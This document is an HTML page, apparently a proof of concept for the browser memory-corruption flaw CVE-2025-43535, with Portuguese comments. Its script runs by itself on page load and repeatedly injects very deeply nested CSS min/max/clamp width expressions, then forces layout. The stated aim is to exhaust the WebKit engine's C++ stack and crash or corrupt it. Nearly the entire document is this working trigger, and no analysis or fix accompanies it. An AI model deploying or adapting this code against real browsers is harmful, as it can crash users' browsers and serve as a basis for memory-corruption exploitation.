<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 PoC — Profundidade Extrema</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px;
         height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<h3>CVE-2025-43535 — Memory Corruption (Bypass de Limite JS)</h3>
<div id="log"></div>

<script>
"use strict";

const L=(m,c)=>{const d=document.getElementById('log');
  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop=d.scrollHeight;
};

const yieldGC = () => new Promise(r => setTimeout(r, 150));

async function variant1_css_calc_deep() {
  L("[V1] Iniciando (Estratégia Híbrida)...");

  const el = document.createElement('div');
  el.style.cssText = 'position:absolute;top:-9999px';
  document.body.appendChild(el);

  const mathCache = {};

  // Geração Híbrida: Agressiva na base, Profunda no topo
  function makeMathNested(depth) {
    if (depth <= 0) return '10px';
    if (mathCache[depth]) return mathCache[depth];

    const funcs = ['min', 'max', 'clamp'];
    const f = funcs[depth % 3];
    let result = '';

    // Crescimento Exponencial Original (Agressivo)
    if (depth <= 24) {
      if (f === 'clamp') {
        result = `clamp(${makeMathNested(depth-1)}, ${depth*5}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
      } else {
        result = `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
      }
    } 
    // Crescimento Linear (Fura-Teto)
    else {
      // Ao invés de duplicar a árvore do d-1, fixamos um lado.
      // Isso empurra a pilha de execução do C++ para o fundo sem dobrar a RAM!
      if (f === 'clamp') {
        result = `clamp(${makeMathNested(depth-1)}, ${depth*5}px, 10px)`;
      } else {
        result = `${f}(${makeMathNested(depth-1)}, 10px)`;
      }
    }

    mathCache[depth] = result;
    return result;
  }

  // FASE 1: Aquecimento Agressivo
  L("[V1] Carregando Base Agressiva 24 no C++...");
  try {
    el.style.width = makeMathNested(24);
    void el.offsetWidth;
    L(`[V1] Base 24 carregada com sucesso!`, "ok");
  } catch(e) {
    L(`[V1] Erro na base: ${e}`, "fail");
  }
  
  el.style.width = '10px';
  await yieldGC();

  L("[V1] Rompendo a barreira do 27. Subindo até o 60...");

  // FASE 2: Furando o teto do JavaScriptCore
  // Agora podemos ir MUITO além do 27 sem dar falta de memória no JS
  for (let d = 25; d <= 60; d++) {
    try {
      L(`[V1] Injetando profundidade ${d}...`);
      await new Promise(r => requestAnimationFrame(r)); 
      
      el.style.width = makeMathNested(d);
      void el.offsetWidth; // Força o WebKit a montar a árvore
      L(`[V1] Profundidade ${d} sobreviveu!`, "ok");
    } catch(e) {
      L(`[V1] Exceção na profundidade ${d}: ${e}`, "fail");
    }
    
    el.style.width = '10px';
    await yieldGC(); 
  }

  document.body.removeChild(el);
  L("[V1] Escala Extrema Finalizada", "ok");
}

async function main() {
  try {
    await variant1_css_calc_deep();
    L("=== FIM DA EXECUÇÃO ===", "ok");
  } catch(e) {
    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
  }
}

window.addEventListener('load', () => setTimeout(main, 500));
</script>
</body>
</html>
